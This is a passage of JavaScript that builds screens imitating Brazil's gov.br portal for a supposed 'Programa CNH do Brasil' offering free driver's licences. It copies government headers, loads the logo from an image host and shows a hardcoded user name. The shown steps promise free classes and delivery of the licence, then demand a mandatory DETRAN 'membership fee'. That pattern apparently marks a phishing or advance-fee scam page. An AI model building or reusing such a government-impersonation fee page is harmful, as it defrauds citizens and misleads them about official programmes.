        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal seguindo exatamente o HTML original
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'w-full';

        const content = document.createElement('div');

        // Número 3 e título
        const header = document.createElement('div');
        header.className = 'flex items-center gap-3 mb-4';
        header.style.cssText = 'opacity: 1; transform: none;';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '3';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        header.appendChild(numberCircle);
        
        const title = document.createElement('p');
        title.className = 'font-semibold text-base';
        title.textContent = 'Aulas Teóricas e Práticas';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        header.appendChild(title);
        
        content.appendChild(header);

        // Container com imagem e texto
        const imageTextContainer = document.createElement('div');
        imageTextContainer.className = 'space-y-3 flex flex-col items-center';

        // Imagem cnhapp.png (mesma imagem)
        const imageContainer = document.createElement('div');
        imageContainer.className = 'flex justify-center mb-4';
        imageContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const appImage = document.createElement('img');
        appImage.src = 'img/cnhapp.png';
        appImage.alt = 'Aulas Teóricas e Práticas';
        appImage.className = 'w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg';
        appImage.style.cssText = 'max-height: 400px;';
        
        imageContainer.appendChild(appImage);
        imageTextContainer.appendChild(imageContainer);

        // Container de texto cinza
        const textContainer = document.createElement('div');
        textContainer.className = 'bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]';
        textContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const descriptionText = document.createElement('p');
        descriptionText.className = 'text-gray-700 leading-relaxed text-base';
        descriptionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; line-height: 1.6; text-align: justify;';
        descriptionText.textContent = 'Suas aulas teóricas serão realizadas 100% pelo aplicativo, totalmente GRATUITAS! Para a parte prática, você precisará fazer apenas 2 horas de aula com um instrutor credenciado pelo DETRAN. Se você for aprovado para a gratuidade do programa, essas aulas práticas também serão gratuitas!';
        
        textContainer.appendChild(descriptionText);
        imageTextContainer.appendChild(textContainer);
        content.appendChild(imageTextContainer);

        // Botão Avançar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const advanceBtn = document.createElement('button');
        advanceBtn.type = 'button';
        advanceBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        advanceBtn.textContent = 'Avançar';
        
        advanceBtn.addEventListener('click', () => {
            // Ir para a tela 4 - Emissão da CNH com transição suave
            this.transitionScreens(() => this.navigateToScreen('cnhIssuance'));
        });
        
        buttonContainer.appendChild(advanceBtn);
        content.appendChild(buttonContainer);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);
    }

    showCnhIssuanceScreen() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal no formato correto
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        cookieBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-3zm-3 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9z"/></svg>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        gridBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zm8 0A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm-8 8A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm8 0A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 1.5 1.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3z"/></svg>';
        rightContainer.appendChild(gridBtn);
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal seguindo exatamente o HTML original
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'w-full';

        const content = document.createElement('div');

        // Número 4 e título
        const header = document.createElement('div');
        header.className = 'flex items-center gap-3 mb-4';
        header.style.cssText = 'opacity: 1; transform: none;';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '4';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        header.appendChild(numberCircle);
        
        const title = document.createElement('p');
        title.className = 'font-semibold text-base';
        title.textContent = 'Emissão da CNH';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        header.appendChild(title);
        
        content.appendChild(header);

        // Container com imagem e texto
        const imageTextContainer = document.createElement('div');
        imageTextContainer.className = 'space-y-3 flex flex-col items-center';

        // Imagem cnhapp.png (mesma imagem)
        const imageContainer = document.createElement('div');
        imageContainer.className = 'flex justify-center mb-4';
        imageContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const appImage = document.createElement('img');
        appImage.src = 'img/cnhapp.png';
        appImage.alt = 'Emissão da CNH';
        appImage.className = 'w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg';
        appImage.style.cssText = 'max-height: 400px;';
        
        imageContainer.appendChild(appImage);
        imageTextContainer.appendChild(imageContainer);

        // Container de texto cinza
        const textContainer = document.createElement('div');
        textContainer.className = 'bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]';
        textContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const descriptionText = document.createElement('p');
        descriptionText.className = 'text-gray-700 leading-relaxed text-base';
        descriptionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; line-height: 1.6; text-align: justify;';
        descriptionText.textContent = 'Após aprovação nos exames teórico e prático, sua CNH será emitida e enviada diretamente para seu endereço. Todo o processo é acompanhado pelo sistema oficial do programa.';
        
        textContainer.appendChild(descriptionText);
        imageTextContainer.appendChild(textContainer);
        content.appendChild(imageTextContainer);

        // Botão Avançar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const advanceBtn = document.createElement('button');
        advanceBtn.type = 'button';
        advanceBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        advanceBtn.textContent = 'Avançar';
        
        advanceBtn.addEventListener('click', () => {
            // Ir para a tela 5 - Taxa de Adesão DETRAN com transição suave
            this.transitionScreens(() => this.navigateToScreen('tax'));
        });
        
        buttonContainer.appendChild(advanceBtn);
        content.appendChild(buttonContainer);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);
    }

    showTaxScreen() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal no formato correto
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const cookieBtn = document.createElement('button');
        cookieBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        cookieBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-3zm-3 2a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9zm0 3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-9z"/></svg>';
        rightContainer.appendChild(cookieBtn);
        
        const gridBtn = document.createElement('button');
        gridBtn.type = 'button';
        gridBtn.setAttribute('aria-label', 'Sistemas');
        gridBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); cursor: pointer; margin-left: 24px; background: none; box-shadow: none; padding: 0px;';
        gridBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zm8 0A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm-8 8A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm8 0A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 1.5 1.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3z"/></svg>';
        rightContainer.appendChild(gridBtn);
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal seguindo exatamente o HTML original
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 1200px; margin: 0px auto; padding: 1rem;';

        const container = document.createElement('div');
        container.className = 'w-full';

        const content = document.createElement('div');

        // Número 5 e título
        const header = document.createElement('div');
        header.className = 'flex items-center gap-3 mb-4';
        header.style.cssText = 'opacity: 1; transform: none;';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '5';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        header.appendChild(numberCircle);
        
        const title = document.createElement('p');
        title.className = 'font-semibold text-base';
        title.textContent = 'Taxa de Adesão DETRAN';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        header.appendChild(title);
        
        content.appendChild(header);

        // Container com imagem e texto
        const imageTextContainer = document.createElement('div');
        imageTextContainer.className = 'space-y-3 flex flex-col items-center';

        // Imagem governoFederal.png
        const imageContainer = document.createElement('div');
        imageContainer.className = 'flex justify-center mb-4';
        imageContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const govImage = document.createElement('img');
        govImage.src = 'img/governoFederal.png';
        govImage.alt = 'Taxa de Adesão DETRAN';
        govImage.className = 'w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg';
        govImage.style.cssText = 'max-height: 400px;';
        
        imageContainer.appendChild(govImage);
        imageTextContainer.appendChild(imageContainer);

        // Container de texto cinza
        const textContainer = document.createElement('div');
        textContainer.className = 'bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]';
        textContainer.style.cssText = 'opacity: 1; transform: none;';
        
        const descriptionText = document.createElement('p');
        descriptionText.className = 'text-gray-700 leading-relaxed text-base';
        descriptionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; line-height: 1.6; text-align: justify;';
        descriptionText.textContent = 'Para validar sua participação no programa, o DETRAN cobra uma taxa administrativa de adesão. Esta taxa é obrigatória para verificar sua elegibilidade e garantir seu acesso ao Programa CNH do Brasil.';
        
        textContainer.appendChild(descriptionText);
        imageTextContainer.appendChild(textContainer);
        content.appendChild(imageTextContainer);

        // Botão Finalizar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const finishBtn = document.createElement('button');
        finishBtn.type = 'button';
        finishBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        finishBtn.textContent = 'Finalizar';
        
        finishBtn.addEventListener('click', () => {
            // Ir para a tela final com transição suave
            this.transitionScreens(() => this.navigateToScreen('final'));
        });
        
        buttonContainer.appendChild(finishBtn);
        content.appendChild(buttonContainer);

        container.appendChild(content);
        main.appendChild(container);
        this.container.appendChild(main);
    }

    showFinalScreen() {
        // Mostrar tela intermediária com loading
        this.showLoadingScreen();
    }

    showLoadingScreen() {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header principal
        const mainHeader = document.createElement('header');
        mainHeader.style.cssText = 'background-color: white; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; box-shadow: none;';
        
        // Container esquerdo
        const leftContainer = document.createElement('div');
        leftContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const logoImg = document.createElement('img');
        logoImg.src = 'https://i.ibb.co/zPFChvR/logo645.png';
        logoImg.alt = 'Logo gov.br estilizada com texto em azul e amarelo';
        logoImg.width = 70;
        logoImg.height = 24;
        logoImg.style.cssText = 'margin-right: 32px; background: none; box-shadow: none;';
        leftContainer.appendChild(logoImg);
        
        const menuBtn = document.createElement('button');
        menuBtn.setAttribute('aria-label', 'Menu de links');
        menuBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 14px; margin-left: 32px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><circle cx="8" cy="3" r="2"/><circle cx="8" cy="8" r="2"/><circle cx="8" cy="13" r="2"/></svg>';
        leftContainer.appendChild(menuBtn);
        
        const divider = document.createElement('div');
        divider.style.cssText = 'border-left: 1px solid rgb(204, 204, 204); height: 24px; margin: 0px 16px; background: none; box-shadow: none;';
        leftContainer.appendChild(divider);
        
        mainHeader.appendChild(leftContainer);
        
        // Container direito
        const rightContainer = document.createElement('div');
        rightContainer.style.cssText = 'display: flex; align-items: center; background: none; box-shadow: none;';
        
        const userBtn = document.createElement('button');
        userBtn.type = 'button';
        userBtn.style.cssText = 'background-color: rgb(20, 81, 180); color: white; border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 9999px; padding: 6px 16px; display: flex; align-items: center; font-size: 14px; cursor: pointer; margin-left: 24px; box-shadow: none;';
        userBtn.innerHTML = '<svg aria-hidden="true" style="color: white; margin-right: 8px; background: none; box-shadow: none; font-size: 16px;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg><span>ALBERTINO</span>';
        rightContainer.appendChild(userBtn);
        
        mainHeader.appendChild(rightContainer);
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
